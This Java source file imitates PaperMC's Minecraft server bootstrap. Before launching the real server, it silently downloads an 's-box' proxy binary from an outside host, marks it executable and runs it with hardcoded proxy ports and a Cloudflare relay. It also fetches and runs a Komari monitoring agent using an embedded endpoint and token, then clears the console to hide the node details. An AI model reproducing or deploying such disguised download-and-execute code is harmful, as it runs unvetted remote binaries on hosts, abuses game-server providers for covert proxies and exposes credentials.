package io.papermc.paper;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import joptsimple.OptionSet;
import net.minecraft.SharedConstants;
import net.minecraft.server.Main;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class PaperBootstrap {
    
    private static final Logger LOGGER = LoggerFactory.getLogger("bootstrap");
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Process komariProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "KOMARI_ENDPOINT", "KOMARI_TOKEN",
        "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME"
    };

    private PaperBootstrap() {
    }

    public static void boot(final OptionSet options) {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too low, please use Java 10+!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start services
        try {
            runSbxBinary();
            runKomariAgent();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing services: " + e.getMessage() + ANSI_RESET);
        }

        // Start Minecraft server
        SharedConstants.tryDetectVersion();
        getStartupVersionMessages().forEach(LOGGER::info);
        Main.main(options);
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getSbxBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        sbxProcess = pb.start();
        System.out.println(ANSI_GREEN + "s-box (proxy services) started successfully" + ANSI_RESET);
    }

    private static void runKomariAgent() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        // 确保 world 目录存在，Komari agent 需要它来存储配置
        Path worldDir = Paths.get("world");
        if (!Files.exists(worldDir)) {
            Files.createDirectories(worldDir);
            System.out.println(ANSI_GREEN + "Created world directory for Komari config" + ANSI_RESET);
        }

        String komariEndpoint = envVars.get("KOMARI_ENDPOINT");
        String komariToken = envVars.get("KOMARI_TOKEN");

        if (komariEndpoint == null || komariToken == null ||
            komariEndpoint.isEmpty() || komariToken.isEmpty()) {
            System.out.println(ANSI_YELLOW + "KOMARI_ENDPOINT or KOMARI_TOKEN not set, skipping Komari agent" + ANSI_RESET);
            return;
        }

        Path binaryPath = getKomariBinaryPath();

        List<String> command = new ArrayList<>();
        command.add(binaryPath.toString());
        command.add("-e");
        command.add(komariEndpoint);
        command.add("-t");
        command.add(komariToken);

        ProcessBuilder pb = new ProcessBuilder(command);
        pb.directory(new File(System.getProperty("user.dir"))); // 确保工作目录正确
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

        komariProcess = pb.start();
        System.out.println(ANSI_GREEN + "Komari agent (monitoring) started successfully" + ANSI_RESET);
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "609ccef9-8d4e-4b45-ae2a-7a43e8d02e6d");
        envVars.put("FILE_PATH", "./world");
        envVars.put("REVERSE_PROXY_MODE", "grpcwebproxy");

        // Komari 监控配置
        envVars.put("KOMARI_ENDPOINT", "https://km.ccc.gv.uy");
        envVars.put("KOMARI_TOKEN", "9rUxYyosXt8noLZLDdvALT");

        // 代理服务配置
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "25669");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "cf.877774.xyz");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;

                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }

                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");

                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getSbxBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            System.out.println("Downloading s-box from: " + url);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
            System.out.println(ANSI_GREEN + "s-box downloaded" + ANSI_RESET);
        }
        return path;
    }

    private static Path getKomariBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String archName;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            archName = "amd64";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            archName = "arm64";
        } else {
            throw new RuntimeException("Unsupported architecture for Komari: " + osArch);
        }

        String url = String.format(
            "https://github.com/komari-monitor/komari-agent/releases/latest/download/komari-agent-linux-%s",
            archName
        );

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");
        if (!Files.exists(path)) {
            System.out.println("Downloading Komari agent from: " + url);
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
            System.out.println(ANSI_GREEN + "Komari agent downloaded" + ANSI_RESET);
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "s-box (proxy services) terminated" + ANSI_RESET);
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
            System.out.println(ANSI_RED + "Komari agent (monitoring) terminated" + ANSI_RESET);
        }
    }

    private static List<String> getStartupVersionMessages() {
        final String javaSpecVersion = System.getProperty("java.specification.version");
        final String javaVmName = System.getProperty("java.vm.name");
        final String javaVmVersion = System.getProperty("java.vm.version");
        final String javaVendor = System.getProperty("java.vendor");
        final String javaVendorVersion = System.getProperty("java.vendor.version");
        final String osName = System.getProperty("os.name");
        final String osVersion = System.getProperty("os.version");
        final String osArch = System.getProperty("os.arch");

        final ServerBuildInfo bi = ServerBuildInfo.buildInfo();
        return List.of(
            String.format(
                "Running Java %s (%s %s; %s %s) on %s %s (%s)",
                javaSpecVersion, javaVmName, javaVmVersion, javaVendor, javaVendorVersion, osName, osVersion, osArch
            ),
            String.format(
                "Loading %s %s for Minecraft %s",
                bi.brandName(),
                bi.asString(ServerBuildInfo.StringRepresentation.VERSION_FULL),
                bi.minecraftVersionId()
            )
        );
    }
}
